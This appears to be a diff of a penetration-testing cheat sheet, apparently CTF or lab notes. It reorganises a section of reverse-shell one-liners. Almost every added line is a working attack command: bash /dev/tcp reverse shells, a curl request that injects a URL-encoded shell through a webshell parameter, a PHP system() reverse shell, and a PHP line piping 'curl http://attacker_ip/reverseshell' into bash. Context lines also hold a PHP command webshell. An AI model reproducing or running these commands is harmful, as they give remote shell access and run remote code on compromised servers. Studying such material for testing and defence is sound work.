@@ -111,7 +111,31 @@ echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
 {% hint style="danger" %}
 ## <mark style="color:purple;">Reverse Shells</mark>
 
-### <mark style="color:purple;">Python Reverse Shells</mark>
+### <mark style="color:orange;">`BASH`</mark> <mark style="color:purple;">Reverse Shells</mark>
+
+{% code title="Standard Shell" %}
+```bash
+bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
+```
+{% endcode %}
+
+* <mark style="color:purple;">From a</mark> <mark style="color:orange;">**`webshell`**</mark> <mark style="color:purple;">upgrade to a reverse shell:</mark>
+
+{% code title="Use Curl" overflow="wrap" %}
+```bash
+curl 'http://target-site/error.php?tokyo=bash+-c+"bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261"'
+```
+{% endcode %}
+
+{% code title="Use the URL parameter" %}
+```url
+bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.14/9001+0>%261'
+```
+{% endcode %}
+
+***
+
+### <mark style="color:green;">`Python`</mark> <mark style="color:purple;">Reverse Shells</mark>
 
 #### <mark style="color:purple;">One liners</mark>
 
@@ -154,6 +178,22 @@ subprocess.call(["/bin/sh", "-i"])
 s.close()' > shell.py
 ```
 {% endcode %}
+
+***
+
+### <mark style="color:orange;">`PHP`</mark> <mark style="color:purple;">Reverse shell:</mark>
+
+{% code title="Direct reverse shell" overflow="wrap" %}
+```php
+<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");?>
+```
+{% endcode %}
+
+* <mark style="color:purple;">**Writes a file to the server, which fetches and executes a remote reverse shell via**</mark>**&#x20;**<mark style="color:orange;">**`curl`**</mark><mark style="color:purple;">**:**</mark>
+
+```php
+<?php system("curl http://attacker_ip/reverseshell | bash"); ?>
+```
 {% endhint %}
 
 
@@ -188,19 +228,6 @@ exec "/bin/sh"                # (From within IRB)
 
 
 
-
-
-***
-
-
-
-HTTP
-
-```bash
-With Url:
-<http://10.10.14.14/$>(bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1')
-```
-
 PHP
 
 ```bash
@@ -224,10 +251,3 @@ bash -i >& /dev/tcp/10.10.14.16/443 0>&1
 #Copy it in to file with at http server
 echo '<?php system("curl <http://10.10.14.16:80/hey> | bash"); ?>'
 ```
-
-Standard [shell.sh](http://shell.sh)
-
-```c
-bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
-```
-
